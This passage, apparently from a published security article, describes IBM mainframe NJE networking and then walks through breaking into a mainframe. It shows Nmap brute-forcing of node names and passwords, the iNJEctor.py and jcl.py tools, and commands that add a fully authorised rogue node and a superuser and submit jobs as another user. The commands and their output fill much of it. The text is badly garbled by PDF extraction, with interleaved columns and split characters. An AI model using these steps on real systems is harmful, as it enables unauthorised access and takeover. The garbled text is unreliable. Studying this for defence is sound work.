out the rest of this article, you’ll see page references
to the sections within this document that describe
the process or record format being discussed.
6.3.1
39 See
page
page
41 See page
42 See page
40 See
1 |−−−−−−−− TTR −−−−−−−−−−|−−− TTB −−−|SO |
00 00 00 12 00 00 00 00 00 00 00 02 01
3
|EN|−− TTR −−−−|
5 | 2D 00 00 00 00
The Handshake
I’m not going to go into the TCP/IP handshake, as
you should be already familiar with it. After you’ve
established a TCP connection nothing happens, lit-
erally. If you find an open port on an NJE server
and connect to it with anything, the server will not
send a banner or let you know what’s up. It just
sits there and waits. It waits for a very specific ini-
tialization packet that is 33 bytes long. 39 Figure 11
shows a breakdown of this packet.
Taking a look at a connection to POTATO from
CACTUS, we see that CACTUS sends the packet in
Figure 12 and receives the packet in Figure 13.
This is the expected response when sending valid
OHOST and RHOST fields. If you send an OPEN,
and either of those are incorrect, you get a NAK re-
sponse TYPE, followed by 24 zeroes and a reason
code. Notice that you don’t need a valid OIP/RIP;
it can be anything.
Here’s the reply when we send an RHOST and
an OHOST of FAKE:
SOH WHAT?
Notice that in some instances there’s also a TTR
footer of four bytes of 0x00.
The NJE server replies with:
1 |−−−−−−−− TTR −−−−−−−−−−|−−− TTB −−−|DL |
00 00 00 12 00 00 00 00 00 00 00 02 10
3
| A0|−− TTR −−−−|
5 70 00 00 00 00
or DLE (0x10) ACK0 (0x70). These are the ex-
pected control responses to our SOH/ENQ.
189 of has2a620.pdf.
13 of has2a620.pdf.
194 of has2a620.pdf.
111 of has2a620.pdf.
40Name
TYPE
Length (bytes)
8 Encoding
EBCDIC
8
4
8
4
1 EBCDIC
—
EBCDIC
—
—
RHOST
RIP
OHOST
OIP
R
Description
One of OPEN (open a connection), ACK (acknowledge a
connection) or NAK (deny a connection). Padded with
spaces.
The name of the originating node, padded with spaces.
The IP address of the originating node.
Padded name of the node you’re trying to connect to.
IP address of target node.
Reason code for NAK (0x01 or 0x04).
Figure 11 – 33-byte NJE handshake packet
TYPE − − − − − − − − − OHOST − − − − − − − − − OIP − − − − RHOST − − − − − − − − −
2 D6 D7 C5 D5 40 40 40 40 D7 D6 E3 C1 E3 D6 40 40 0A 0D 25 0A C3 C1 C3 E3 E4 E2 40 40
O P E N
P O T A T O
10 13 37 10 C A C T U S
4
RIP − − − − R
6 0A 0A 0A 02 00
10 10 10 02 0
Figure 12 – CACTUS sends this packet.
1 TYPE − − − − − − − − − OHOST − − − − − − − − − OIP − − − − RHOST − − − − − − − − −
C1 C3 D2 40 40 40 40 40 C3 C1 C3 E3 E4 E2 40 40 00 00 00 00 D7 D6 E3 C1 E3 D6 40 40
3 A C K
C A C T U S
0 0 0 0 P O T A T O
5 RIP − − − − R
0A 0A 0A 01 00
7 10 10 10 01 0
Figure 13 – CACTUS receives this packet.
416.3.3
NCCR, not a Cruise Line!
1 − 0 x00 End o f b l o c k
− 0 x90 Request t o s t a r t stream
The next part of initialization is sending an ‘I’
3 − 0xA0 P e r m i s s i o n t o s t a r t Stream
record. NJE has a bunch of different types of
− 0xB0 Deny r e q u e s t t o s t a r t stream
records, I, J, K, L, M, N, and B. These are known 5 − 0xC0 Acknowledge t r a n s m i s s i o n c o m p l e t e
− 0xD0 Ready t o r e c e i v e stream
as Networking Connection Control Records (NCCR)
42
7
− 0xE0 BCB e r r o r
and control NJE node connectivity.
The impor-
− 0xF0 C o n t r o l r e c o r d (NCCR)
tant ones to know are I (Initial Signon), J (Signon 9 − 0x9A Command o r message (NMR)
Reply), and B (Close Connection).
− 0 x98−0xF8 SYSIN ( i n c o m i n g data , u s u a l l y
JCL can be o t h e r s t u f f )
An initial sign-on record is made up of many
11
−
0
x99−0xF9
SYSOUT ( ou tp ut from j o b s , f i l e s ,
components. The important things to know here are
etc )
that the RCB is 0xF0, the SRCB is the letter ‘I’ in
EBCDIC (0xC9), and that there are fields within an
NCCR I record called NCCILPAS and NCCINPAS that
SRCB is a Source Record Control Byte. For each
are used for password-protected nodes. NCCILPAS ×
RCB
a SRCB is required (IBM calls it a Source
2 is used when the nodes passwords are the same,
Record
Control Byte, but I like to think of it as
whereas you’d use NCCINPAS if the local password
46
“Second.”)
is different from the target password. For exam-
ple, if we set the PASSWORD= in NJEDEF above 1 − 0 x90 t h r o u g h 0xD0 t h e SRCB i s t h e RCB
o f t h e stream t o be s t a r t e d .
to NJEROCKS, we’d put NJEROCKS in both the
3 − 0xE0 t h e SRCB i s t h e c o r r e c t BCB.
NCCILPAS and NCCINPAS fields.
− 0xF0 The NCCR t y p e ( e x p l a i n e d i n 3 . 4 )
We send an I record, then receive a J record, and 5 − 0x9A Always 0 x00
− 0 x98−F8 D e f i n e s t h e t y p e o f i n c o m i n g data .
now the two mainframes are connected to one an-
other. Since we added trusted nodes with RACF, we 7 − 0 x99−F9 D e f i n e s t h e t y p e o f ou tp ut data .
can now submit jobs between the two mainframes as
users from one system to another. If a user exists
And finally here is the data. The maximum
on both mainframes, jobs submitted from one main-
length of a record (or TTR) is 255 bytes. Each
frame to run on another will be executed as that user
record must have an RCB and a SRCB, which ef-
on the target system. The assumption is that both
fectively means that each chunk of data cannot be
mainframes are secure and trusted (otherwise why
longer than 253 bytes. That’s not a lot of room! For-
would you set them up?)
tunately, NJE implements compression using SCB,
or String Control Bytes. 47 SCB compresses dupli-
6.3.4 Bigger Packets
cate characters and repeated spaces using a control
As we get deeper into the NJE connection, more
byte that uses a byte’s two high order bits to de-
layers get added on. Once we’ve reached this phase,
note that either the following character should be
additional items are are now included in every NJE
repeated x times (101x xxxx), a blank should be in-
packet: TTB → TTR → DLE → STX → BCB →
serted x times (100x xxx), or the following x char-
FCS → RCB → SRCB → DATA
acters should be skipped to find the next control
byte (11xx xxxx). 0x00 denotes the end of com-
We already talked about TTB and TTR. DLE
pressed data, whereas 0x40 denotes that the stream
(0x10) and STX (0x02) are transmission control.
should be terminated. Not everything needs to be
The BCB, or Block Control Byte, is always 0x80
compressed (for example NCCR records don’t need
plus a modulo 16 number. It is used for tracking the
to be).
current sequence number and is incremented each
Figure 14 shows a breakdown of the following
time data is sent. 43 FCS is the Function Control
packet: 00 00 00 3b 00 00 00 00 00 00 00 2b
Sequence. The FCS is two bytes long and identifies
10 02 82 8f cf 9a 00 cd 90 77 00 09 d5 c5
the stream to be used. 44 RCB is a Record Control
e6 e8 d6 d9 d2 40 01 a8 00 c6 d7 d6 e3 c1
Byte, which can be one of the following: 45
43 See
page
page
45 See page
46 See page
47 See page
44 See
119
122
124
125
123
of
of
of
of
of
has2a620.pdf.
has2a620.pdf.
has2a620.pdf.
has2a620.pdf.
has2a620.pdf.
42Well, the problem is that whoever set up the ac-
counts didn’t bother to check all the environments
before creating the new user account on DEV. Since
DEV and PROD are trusted nodes in an NJE net-
work, Jennifer could submit jobs to the produc-
tion environment (using /*XEQ PROD), and the JCL
would execute under Johns permissions—not a very
secure setup. Worse still, the logs on PROD will
show that John was the one messing with payroll to
give Jennifer a raise.
e3 d6 82 ca 01 5b c4 40 d5 d1 c5 c4 c5 c6
00 00 00 00 00
Since this is an NMR (RCB = 0x9A), we can
break down the data after decompression using the
format described by IBM. 48 The decompressed pay-
load is shown in Figure 15.
Therefore, this rather long packet was used
to send the command $D NJEDEF from the node
POTATO to the node NEWYORK.
6.4
Abusing NJE
6.4.1
As discussed in Section 6.2.2, userids are expected
to be the same across nodes. But knowing how en-
terprises operate requires conducting a little test.
Pretend that you work for a large enterprise
with multiple mainframe environments all connected
through NJE. In this example, two nodes exist: (1)
DEV and (2) PROD.
A user named John Smith, who manages pay-
roll, frequently works in the production environment
(PROD) and has an account on that system with the
userid “JSMITH.”
A developer named Jennifer Smith is hired to
help with transaction processing. Jennifer will only
ever do work on the development environment, so an
“Identity Manager” assigns her the user id “JSMITH”
on the DEV mainframe.
What is the problem in this example? How could
Jennifer exploit her access on DEV to get a bigger
paycheck?
Garbage SYSIN
When JCL is sent between nodes, it is called SYSIN
data. To control who the data is from, the type of
data, etc., a few more pieces of data are added to
the NJE record. When JES2 processes JCL, it cre-
ates the SYSIN records. As it processes the JCL, it
identifies the /*XEQ command and creates the Job
Header, Job Data, and Job Footer. 49
Job Data is the JCL being sent, Job Footer is
some trailing information, and Job Header is where
the important components (for us) live.
Within the Job Header itself there are four sub-
sections: General, Scheduling, Job Accounting, and
Security.
The first three are boring and are just system
stuff. (They’re actually very exciting, but for this
writeup they aren’t important.) The good bits are
in the Security Section Job Header. The security
section header is made up of 18 settings: 50
48 See
page 102 of has2a620.pdf.
page 19 of has2a620.pdf.
50 See page 38 of has2a620.pdf.
49 See
Type
TTB
TTR
DLE
STX
BCB
FCS
RCB
SRCB
Data
TTB
Data
00 00 00 3b 00 00 00 00
00 00 00 2a
10
02
82
8f cf
9a
00
See Below
00 00 00 00
Value
59
43
DLE
STX
2
n/a
NMR Command/Message
n/a
See Below
TTB Footer
The Data field was compressed using SCB. It decompresses to 90 77 00 09 d5 c5 e6 e8 d6 d9 d2 40 01
00 00 00 00 00 00 00 00 d7 d6 e3 c1 e3 d6 40 40 01 5b c4 40 d5 d1 c5 c4 c5 c6.
Figure 14 – Example NJE packet
43Item
NMRFLAG
NMRLEVEL
NMRTYPE
NMRML
NMRTONOD
NMRTOQUL
NMROUT
NMRFMNOD
NMRFMQUL
NMRMSG
Data
90
77
00
09
d7 d6
01
00 00
c3 c1
01
5b c4
e3 c1 e3 d6 40 40
00 00 00 00 00 00
c3 e3 e4 e2 40 40
40 d5 d1 c5 c4 c5 c6
Value
NMRFLAGC Set to ‘on’. Which means its a command.
Highest level
Unformatted command.
Length of NMRMSG
To NEWYORK
The identifier. Node 1.
The UserID, Console ID. In this case, blank.
From POTATO
From identifier. Can be the same.
Command: “$D NJEDEF” in EBCDIC
Figure 15 – Decompressed payload from Figure 14.
Name
NJHTLEN
NJHTTYPE Size
2B
1B
NJHTMOD 1B
NJHTLENP
NJHTFLG0 2B
1B
NJHTLENT
NJHTVERS
NJHTFLG1 1B
1B
1B
NJHTSTYP
NJHTFLG2 1B
1B
NJHT2DFT
NJHTUNRF
NJHT2MLO
NJHT2SHI
NJHT2TRS
NJHT2SUS
NJHT2RMT
NJHTPOEX
NJHTSECL
NJHTCNOD
NJHTSUSR
NJHTSNOD
NJHTSGRP
NJHTPOEN
NJHTOUSR
NJHTOGRP 1b
1b
1b
1b
1b
1b
1b
1B
8B
8B
8B
8B
8B
8B
8B
8B
Description
Length of header
Type
(Always 0x8C for security.)
Modifier
0x00 for security.
Remaining header length.
Flag for NJHTF0JB which
defines the owner.
Total length of sec header.
Version of RACF
Flag byte for
NJHT1EN (Encrypted or not),
NJHT1EXT (format) and
NJHTSNRF (no RACF)
Session type
Flag byte for NJHT2DFT,
NJHTUNRF, NJHT2MLO,
NJHT2SHI, NJHT2TRS,
NJHT2SUS, NJHT2RMT
Not verified
Undefined user without RACF
Multiple leaving options
Security data not verified
A Trusted user
A Surrogate user
Remote job or data set
1
Port of entry class
3
Security label
Security node
5
User ID of Submitter
7
Node the job came from
Group ID of Submitter
9
Originator node name
User ID
11
Group ID
The two most important of these are the
NJHTOUSR and NJHTOGRP variables. These define the
User ID and Group ID of the job coming into the
system. If someone were able to manipulate these
fields within the Job Header before it was sent to
an NJE server, they could execute anything as any
user on the system (so long as they had the ability
to submit jobs, something almost every user does).
At this point you’re basically two fields away from
owning a system.
6.4.2
Command and Control
In Section 6.2.1 we discussed NMR, that is, Nodal
Message Records. These have an RCB of 0x9A. By
far the most interesting property of NMRs is their
ability to send commands from one node to another.
This exists to allow easier, centralized management
of a bunch of mainframe (NJE) nodes on a network.
You send commands, and the reply gets routed back
to you for display.
For example, we can send the JES2 command
$D JQ that will tell us all the jobs that are currently
running. To display all the jobs running on CAC-
TUS from POTATO, we simply add $N 2 in front
of the command we wish to execute: $N 2,’$D JQ’
[...]
1 3 . 4 2 . 0 1 STC00021 $HASP890 JOB(TCPIP)
1 3 . 4 2 . 0 1 STC00021 $HASP890 JOB(TCPIP)
STATUS=(EXECUTING/EMC1) , CLASS=STC,
13.42.01
$HASP890
PRIORITY=15 , SYSAFF=(EMC1) ,
HOLD=(NONE)
1 3 . 4 2 . 0 1 STC00022 $HASP890 JOB( TN3270 )
1 3 . 4 2 . 0 1 STC00022 $HASP890 JOB( TN3270 )
STATUS=(EXECUTING/EMC1) , CLASS=STC,
13.42.01
$HASP890
PRIORITY=15 , SYSAFF=(EMC1) ,
13
HOLD=(NONE)
1 3 . 4 2 . 0 1 TSU00035 $HASP890 JOB(DADE)
4415 1 3 . 4 2 . 0 1 TSU00035 $HASP890 JOB(DADE)
STATUS=(AWAITING HARDCOPY) ,
17
CLASS=TSU,
13.42.01
$HASP890
19
PRIORITY=1 , SYSAFF=(ANY) ,
HOLD=(NONE)
21 [ . . . ]
To make changes at a target system we
can issue commands with $T. The command $D
JOBDEF,JOBNUM tells us the maximum number of
jobs that are allowed to run at one time. We
can increase (or decrease) this number with $T
JOBDEF,JOBNUM=#.
1 $D JOBDEF,JOBNUM
$HASP835 JOBDEF JOBNUM=3000
3 $T JOBDEF,JOBNUM=3001
$D JOBDEF,JOBNUM
5 $HASP835 JOBDEF JOBNUM=3001
1 # ##############NEXT PROBE###################
# Q u e r i e s z /OS Network Job Entry
3 # Sends an NJE Probe with t h e f o l l o w i n g i n f o
# TYPE
= OPEN
5 # OHOST
= FAKE
# RHOST
= FAKE
7 # RIP and OIP = 0 . 0 . 0 . 0
# R
= 0
9 Probe TCP NJE q | \ xd6 \ xd7 \ xc5 \xd5@@@@\ xc6 \ xc1
\ xd2 \xc5@@@@\0\0\0\0\ xc6 \ xc1 \ xd2 \xc5@@@@
\0\0\0\0\0|
rarity 9
11 p o r t s 175
s s l p o r t s 2252
13 # I f t h e p o r t s u p p o r t s NJE i t w i l l r e s p o n d
# with e i t h e r a ’NAK ’ o r ’ACK ’ i n EBCDIC
15 match n j e m| ^ \ xd5 \ xc1 \ xd2 | p/IBM Network Job
Entry ( JES ) /
match n j e m| ^ \ xc1 \ xc3 \ xd2 | p/IBM Network Job
Entry ( JES ) /
Using Nmap it’s now easy to find NJE:
$ nmap −sV −p 175 1 0 . 1 0 . 1 0 . 1
We can do the exact same thing with NJE,
but instead pass it a node number $N 2,’$T
JOBDEF,JOBNUM=3001’. This is the power of NMR
commands. Notice that there are no userids or pass-
words here, only commands going from one system
to another.
A reference for every single JES2 command ex-
ists. 51 Some interesting JES2 commands are the
ones we already talked about (lowering/increasing
number of concurrent jobs), but you can also profile
a mainframe using the various $D (for display) com-
mands. JOBDEF, INITINFO, NETWORK, NJEDEF, JQ,
NODE etc. NJEDEF is especially important!
6.5
2
S t a r t i n g Nmap 6 . 4 9SVN ( h t t p s : //nmap . o r g )
4 Nmap s c a n r e p o r t f o r
LPAR1 .CACTUS.MAINFRAME.COM ( 1 0 . 1 0 . 1 0 . 1 )
6 Host i s up ( 0 . 0 0 1 8 s l a t e n c y ) .
PORT
STATE SERV VERSION
8 175/ t c p open n j e IBM Net Job Entry ( JES )
6.5.2
This is the trickiest part of breaking NJE. Recalling
our earlier discussion of connecting, you need a valid
RHOST (any systems node name) and OHOST
(the target systems node name). If the RHOST
or OHOST are wrong, the system replies with an
NJE NAK reply and a reason code R. Oftentimes the
node name of a mainframe is the same as the host
name; so you should try those first. Otherwise, it
will likely be documented somewhere on a corporate
intranet or in some example JCL code with /*XEQ—
or you could just ask someone, and they’ll probably
tell you.
If you have access to the target mainframe
already, you could try a few things, like read-
ing SYS1.PARMLIB(JES2PARM) and searching for
NJEDEF/NODE. You could also issue the JES2
command $D NJEDEF or $D NODE, which will list all
the nodes and their names:
Breaking In
It’s now time to make NJE do what we want so we
can own a mainframe. But there’s some information
you’ll need to know:
- IP/Port running NJE
- RHOST and OHOST names
- Password for I record (not always)
- A way to connect
6.5.1
RHOST, OHOST, and I Records
Finding a Target System
Of all the steps, this is likely the easiest step to per-
form. The most recent version of Nmap (7.10) re-
ceived an update to probe for NJE listening ports:
51 https://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.hasa200/has2cmdr.htm
45$D node
2 $HASP826 NODE( 1 )
$HASP826 NODE( 1 )
4
6
8
10
12
$HASP826
$HASP826 NODE( 2 )
$HASP826 NODE( 2 )
$HASP826
determine the target systems NJE node
name.
NAME=POTATO,
STATUS=(OWNNODE) ,
TRANSMIT=BOTH,
RECEIVE=BOTH,HOLD=NONE
By default, the script will try to brute-force
a system’s OHOST value. First trying the main-
frame’s hostname and then using Nmap’s included
list of default hosts. Since NJE nodes will generally
only have one node name, it’s best to use the script
argument brute.firstonly=true.
NAME=CACTUS,
STATUS=(CONNECTED) ,
TRANSMIT=BOTH,
RECEIVE=BOTH,
HOLD=NONE
2
$ nmap −sV −p 175 1 0 . 1 0 . 1 0 . 1 \
−−s c r i p t n j e −node−b r u t e \
−−s c r i p t −a r g s b r u t e . f i r s t o n l y=t r u e
4
S t a r t i n g Nmap 7 . 1 0SVN ( h t t p s : //nmap . o r g )
If none of those options work for you, it’s time to 6 Nmap
s c a n r e p o r t f o r LPAR1 .POTATO.MAINFRAME.
use brute force. When you connect to an NJE port
COM ( 1 0 . 1 0 . 1 0 . 1 )
Host i s up ( 0 . 0 0 1 2 s l a t e n c y ) .
and send an invalid OHOST or RHOST, you get a
STATE SERV VERSION
type of NAK with a reason code of R=1. However, 8 PORT
175/ t c p open n j e IBM Net Job Entry ( JES )
when you connect to NJE and place the RHOST 10 | n j e −node−b r u t e :
value in the OHOST field, it replies with a NAK but
|
Node Name( s ) :
Node Name :POTATO − V a l i d c r e d e n t i a l s
with a reason code of 4! Now this is something we 12 |
can use to our advantage.
Using Nmap again, we can now use a newly-
released NSE script nje-node-brute.nse to brute-
With the OHOST determined (POTATO), we
force a system’s OWNNODE node name: 52
can brute-force valid RHOSTs on the target sys-
tem. Using the same nje-node-brute Nmap script,
we use the argument ohost=POTATO. Before run-
NJE node communication is made up
ning the script, it’s best to do some recon and
of an OHOST and an RHOST. Both
discover names of other systems, decommissioned
fields must be present when conducting
systems, etc. These can be placed in the file
the handshake. This script attempts to
52 https://nmap.org/nsedoc/scripts/nje-node-brute.html
unzip pocorgtfo12.pdf nje-node-brute.nse
46rhosts.txt and passed to the script using the ar-
gument hostlist=rhosts.txt:
2
$ nmap −sV −p 175 1 0 . 1 0 . 1 0 . 1 \
−−s c r i p t n j e −node−b r u t e \
−−s c r i p t −a r g s=o h o s t= ’POTATO ’ , h o s t l i s t=
rhosts . txt
4
S t a r t i n g Nmap 7 . 1 0SVN ( h t t p s : //nmap . o r g )
6 Nmap s c a n r e p o r t f o r LPAR1 .POTATO.MAINFRAME.
COM ( 1 0 . 1 0 . 1 0 . 1 )
Host i s up ( 0 . 0 0 0 9 0 s l a t e n c y ) .
8 PORT
STATE SERV VERSION
175/ t c p open n j e IBM Net Job Entry ( JES )
10 | n j e −node−b r u t e :
|
Node Name( s ) :
12 |
POTATO:SANDBOX − V a l i d c r e d e n t i a l s
|
POTATO:CACTUS − V a l i d c r e d e n t i a l s
14 |
POTATO: LPAR5 − V a l i d c r e d e n t i a l s
4
S t a r t i n g Nmap 7 . 1 0SVN ( h t t p s : //nmap . o r g )
6 Nmap s c a n r e p o r t f o r LPAR1 .NEWYORK.MAINFRAME
.COM ( 1 0 . 1 0 . 1 0 . 1 )
Host i s up ( 0 . 0 0 1 2 s l a t e n c y ) .
8 PORT
STATE SERV VERSION
175/ t c p open n j e IBM Net Job Entry ( JES )
10 | n j e −pass −b r u t e :
|
NJE Password :
12 |
Password :NJEROCKS − V a l i d c r e d e n t i a l s
Behind the scenes, this script is connecting
and trying “I Records” setting the NCCILPAS and
NCCINPAS variables to the passwords in your word
list.
6.5.3
Note: If CACTUS was connected at the time
this script was run, it wouldn’t show up in the list
of valid systems. This is due to the fact that a
node may only connect once. So if you’re doing this
kind of testing, you might want to wait for mainte-
nance windows to try and brute-force. With valid
RHOSTs (SANDBOX, CACTUS, and LPAR5) and
the OHOST (POTATO) in hand we can now pre-
tend to be a node.
In most places, this will be enough to allow you
to fake being a node. In some places, however,
they’ll have set the PASSWORD= parameter in the
NJEDEF config. This means that we’ve got one
more piece to brute-force.
Thankfully, there’s yet another new Nmap script
for brute-forcing I records, nje-pass-brute.
After successfully negotiating an
OPEN connection request, NJE requires
sending, what IBM calls, an “I record.”
This initialization record may sometimes
require a password. This script, provided
with a valid OHOST/RHOST for the
NJE connection, brute forces the pass-
word.
Using this script is fairly straightforward. You
pass it an RHOST and OHOST, and it will attempt
to brute-force the I record password field:
2
nmap −sV −p 175 1 0 . 1 0 . 1 0 . 1 \
−−s c r i p t n j e −pass −b r u t e \
−−s c r i p t −a r g s=b r u t e . f i r s t o n l y=t r u e , o h o s t
= ’POTATO ’ , r h o s t= ’ c a c t u s ’ , passdb=
passwords . txt
53 git
I’m a Pretender
Using the information we’ve gathered, we could
set up our own mainframe, add an NJEDEF sec-
tion to the JES2 configuration file, and connect to
POTATO as a trusted node. But who’s got millions
to spend on a mainframe? The good news is you
don’t have to worry about any of that. Since get-
ting your hands on a real mainframe is all but im-
possible, your author wrote a Python library that
implements the NJE specification, allowing you to
connect to a mainframe and pretend to be a node. 53
Using the NJE library, we can do a couple of
interesting things, such as sending commands and
messages, or sending JCL as any user account.
First, we’re going to create our own node, just
in case the node we’re pretending to be comes
back online (preventing us from using it). Using
iNJEctor.py we can send commands we’d like to
have processed by the target node. Before doing
that, we need to see how many nodes are currently
declared with $D NJEDEF,NODENUM:
2
4
$ . / i N J E c t o r . py 1 0 . 1 0 . 1 0 . 1 CACTUS POTATO \
" \$D NJEDEF,NODENUM" −−p a s s NJEROCKS
The JES2 NJE Command I n j e c t o r
6 [ + ] S i g n i n g on t o 1 0 . 1 0 . 1 0 . 1 : 175
[ + ] Si gn on t o 1 0 . 1 0 . 1 0 . 1 Complete
8 [ + ] S e n d i n g Command : $D NJEDEF,NODENUM
[ + ] Reply R e c e i v e d :
10
13.12.26
$HASP831 NJEDEF NODENUM=4
clone https://github.com/zedsec390/NJElib
471 $ . / i N J E c t o r . py 1 0 . 1 0 . 1 0 . 1 CACTUS POTATO " \$T NJEDEF,NODENUM=5" −−p a s s NJEROCKS −q
3 13.25.34
13.25.34
5 13.25.34
13.25.34
7 13.25.34
13.25.34
9 13.25.34
$HASP831 NJEDEF
$HASP831 NJEDEF
$HASP831
$HASP831
$HASP831
$HASP831
$HASP831
OWNNAME=POTATO,OWNNODE=1 ,CONNECT=(YES, 1 0 ) ,
DELAY=120 ,HDRBUF=(LIMIT=10 ,WARN=80 ,FREE=10) ,
JRNUM=1 ,JTNUM=1 ,SRNUM=1 ,STNUM=1 ,LINENUM=1 ,
MAILMSG=NO,MAXHOP=0 ,NODENUM=5 ,PATH=1 ,
RESTMAX=262136000 ,RESTNODE=100 ,RESTTOL=0 ,
TIMETOL=1440
11 $ . / i N J E c t o r . py 1 0 . 1 0 . 1 0 . 1 CACTUS POTATO " \$T NODE( 5 ) , name=H4CKR" −−p a s s NJEROCKS −q
13 1 3 . 2 6 . 1 5
13.26.15
15 1 3 . 2 6 . 1 5
$HASP826 NODE( 5 )
$HASP826 NODE( 5 )
$HASP826
NAME=H4CKR, STATUS=(UNCONNECTED) ,TRANSMIT=BOTH,
RECEIVE=BOTH,HOLD=NONE
17 $ . / i N J E c t o r . py 1 0 . 1 0 . 1 0 . 1 CACTUS POTATO " \ $add s o c k e t ( h 4 c k r ) , node=h4ckr , i p a d d r = 3 . 1 . 3 3 . 7 " \
−−p a s s NJEROCKS −q
19
13.27.13
$HASP897 SOCKET(H4CKR)
21 1 3 . 2 7 . 1 3
$HASP897 SOCKET(H4CKR)
STATUS=INACTIVE , IPADDR= 3 . 1 . 3 3 . 7 ,
13.27.13
$HASP897
PORTNAME=VMNET,CONNECT=(DEFAULT) ,
23 1 3 . 2 7 . 1 3
$HASP897
SECURE=NO, LINE=0 ,NODE=5 ,REST=0 ,
13.27.13
$HASP897
NETSRV=0
Figure 16 – Example use of iNJEctor.py.
We’ll increase that by one with the com-
mand $T NJEDEF,NODENUM=5, then add our own
node called h4ckr using the commands $T
NODE(5),name=H4CKR and $add socket(h4ckr).
See Figure 16.
The node h4ckr has now been created. Finally,
we’ll want to give it full permission to do any-
thing it wants with the command $T node(h4ckr),
auth=(Device=Y,Job=Y,Net=Y,System=Y).
See
Figure 17
Good, we have our own node now. This will
only allow us to send commands and messages. If
we wanted, we could mess with system administra-
tors now.
And when Margo logs on, or tries to do anything
she would receive this message:
1 READY
3 MESS WITH THE BEST DIE LIKE THE REST CN(
INTERNAL)
That is fun and all, but we could also do real
damage, such as shutting off systems or lowering
resources to the point where a system becomes un-
responsive. But where’s the fun in that? Instead,
let’s make our node trusted.
We’ll need to find a user with the appropriate
permissions first. From previous research, I know
Margo runs operations and has a userid of margo.
Using jcl.py we can send JCL to a target node.
This script uses the NJELib library and manipu-
lates the NJHTOUSR and NJHTOGRP settings in the
Job Header Security Section to be any user we’d
like. We already know CACTUS is a trusted node
on POTATO, so let’s use that trust to submit a job
as Margo.
To check if she has the permissions we need,
we use the program IKJEFT01, which executes TSO
commands, and the RACF TSO command lu, which
lists a user’s permissions. We see this in Figure 18.
$ . / i N J E c t o r . py 1 0 . 1 0 . 1 0 . 1 h 4 c k r POTATO \
−u margo −m \
’MESS WITH THE BEST DIE LIKE THE REST ’
4
The JES2 NJE Command I n j e c t o r
2
6 [ + ] S i g n i n g on t o 1 0 . 1 0 . 0 . 2 0 0 : 175
[ + ] Sig n on t o 1 0 . 1 0 . 0 . 2 0 0 Complete
8 [ + ] S e n d i n g Message ( MESS WITH THE BEST DIE
LIKE THE REST ) t o u s e r : margo
[ + ] Message s e n t
482
$ . / i N J E c t o r . py 1 0 . 1 0 . 1 0 . 1 CACTUS POTATO \
" \$T node ( h 4 c k r ) , auth=( D e v i c e=Y, Job=Y, Net=Y, System=Y) " −−p a s s NJEROCKS −q
4 13.29.20
13.29.20
6 13.29.20
13.29.20
8 13.29.20
13.29.20
10 1 3 . 2 9 . 2 0
13.29.20
12 1 3 . 2 9 . 2 0
13.29.20
14 1 3 . 2 9 . 2 0
$HASP826 NODE( 5 )
$HASP826 NODE( 5 )
$HASP826
$HASP826
$HASP826
$HASP826
$HASP826
$HASP826
$HASP826
$HASP826
$HASP826
NAME=H4CKR, STATUS=(UNCONNECTED) ,
AUTH=(DEVICE=YES, JOB=YES,NET=YES,SYSTEM=YES) ,
TRANSMIT=BOTH, RECEIVE=BOTH,HOLD=NONE,
PENCRYPT=NO, SIGNON=COMPAT,ADJACENT=NO,
CONNECT=(NO) ,DIRECT=NO,ENDNODE=NO, REST=0 ,
SENTREST=ACCEPT,COMPACT=0 ,LINE=0 ,LOGMODE=,
LOGON=0 ,NETSRV=0 ,OWNNODE=NO,
PASSWORD=(VERIFY=(NOTSET) ,
SEND=(FROM_OWNNODE) ) ,PATHMGR=YES, PRIVATE=NO,
SUBNET=,TRACE=NO
Figure 17 – iNJEctor.py giving full permissions.
The important line here is ATTRIBUTES=SPECIAL,
meaning that she can execute any RACF command.
This, in turn, means she has the ability to add
trusted nodes for us. Now that we confirmed she
has administrative access, we submit some JCL
that executes the commands we need to add a new
trusted node. While we’re at it, might as well add a
new superuser named DADE, as shown in Figure 19.
Now we added the node H4CKR as a trusted node.
Therefore, any userid that exists on POTATO is now
available to us for our own nefarious purposes. In
addition, we added a superuser called DADE with
access to both TSO and UNIX. From here we could
shutdown POTATO, execute any commands we’d
like, create new users, reset user passwords, down-
load the RACF database, create APF authorized
programs. The ownage is endless.
491 . / j c l . py CACTUS POTATO 1 0 . 1 0 . 1 0 . 1 JCL/ t s o . j c l margo
[ + ] RHOST: CACTUS
3 [ + ] OHOST: POTATO
[ + ] IP
: 10.10.10.1
5 [ + ] F i l e : JCL/ t s o . j c l
[ + ] User : margo
7 [ + ] Connected
===================
9 [ + ] S e n d i n g f i l e : JCL/ t s o . j c l
−−−−−−−−−10−−−−−−−−20−−−−−−−−30−−−−−−−−−40−−−−−−−−−50−−−−−−−−−60−−−−−−−−−70−−−−−−−−−80
11
//H4CKRNJE JOB ( 1 2 3 4 5 6 7 ) , ’ABC 1 2 3 ’ ,CLASS=A,
13 //
MSGLEVEL=(0 ,0) ,MSGCLASS=K,NOTIFY=&SYSUID
/∗XEQ
POTATO
15 //TSOCMD
EXEC PGM=IKJEFT01
//SYSTSPRT DD
SYSOUT=∗
17 //SYSOUT
DD
SYSOUT=∗
//SYSTSIN DD
∗
19
lu
/∗
21
−−−−−−−−−10−−−−−−−−20−−−−−−−−30−−−−−−−−−40−−−−−−−−−50−−−−−−−−−60−−−−−−−−−70−−−−−−−−−80
23 ===================
[ + ] User Message
25 [ + ] User : MARGO
[ + ] Message : 1 5 . 0 3 . 1 9 JOB00046 $HASP122 H4CKRNJE ( JOB00049 FROM CACTUS) RECEIVED AT POTATO
27 ===================
[ + ] Records i n SYSOUT:
29 1
J E S 2 J O B L O G −− S Y S T E M E M C 1 −− N O D E P O T A T O
0
31 [ . . . ]
1READY
33
lu
USER=MARGO NAME=Margo Smith
OWNER=MINING
CREATED=15.104
35
DEFAULT − GROUP=MINING
PASSDATE=16.083 PASS−INTERVAL=180 PHRASEDATE=N/A
ATTRIBUTES=SPECIAL OPERATIONS
37 [ . . . ]
READY
39 END
Figure 18 – JCL permissions check
501 . / j c l . py CACTUS POTATO 1 0 . 1 0 . 1 0 . 1 JCL/ r a c f . j c l margo
[ + ] RHOST: CACTUS
3 [ + ] OHOST: POTATO
[ + ] IP
: 10.10.10.1
5 [ + ] F i l e : JCL/ r a c f . j c l
[ + ] User : margo
7 [ + ] Connected
===================
9 [ + ] S e n d i n g f i l e : JCL/ r a c f . j c l
